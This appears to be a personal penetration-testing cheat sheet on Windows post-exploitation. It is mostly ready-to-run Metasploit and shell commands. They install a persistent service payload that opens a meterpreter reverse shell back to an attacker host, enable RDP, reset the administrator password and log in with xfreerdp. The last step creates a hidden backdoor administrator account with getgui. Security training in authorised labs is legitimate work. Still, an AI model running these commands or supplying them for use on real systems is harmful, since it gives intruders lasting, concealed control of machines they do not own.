
## Establishing Persistence On Windows

+ Persistence consists of techniques that adversaries use to **keep access to systems** across restarts, changed credentials, and other interruptions that could cut off their access.

+ Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

+ We can utilize various post exploitation persistence modules to ensure that we
always have access to the target system.

`search platform:windows persistence`

```bash
msf > use exploit/windows/local/persistence_service
# generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
# to recive the connection
msf > use multi/handler
```

```bash
use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set session <session_number>
set lhost <attacker_ip>
set lport 8787
run


Take access by milti/handler 

use multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 8787
run
```
## Enabling RDP ([[Enable RDP]])

+ The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.

+ RDP uses TCP port 3389 by default.

+ RDP is disabled by default, however, we can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access to the target system.

+ RDP authentication requires a legitimate user account on the target system as well as the user’s password in clear-text.
```bash
msf > post/windows/manage/enable_rdp
set session <session_id>
run
```

change Admin password for take access of RDP 
```
net user administrator password123   
#You must neet admin permistion
```

Now take access
```
xfreerdp /u:administrator /p:password123 /v:<target_ip>
```
------------------

Create a new user
```meterpreter
run getgui -e -u ellusion -p Fuckman123@
```
What it does `getgui` 
- Check the RDP port enable or not, if not then it automatically enable RDP for us
- It hide our backdoor user from login screen
- It add our user to the local administrator group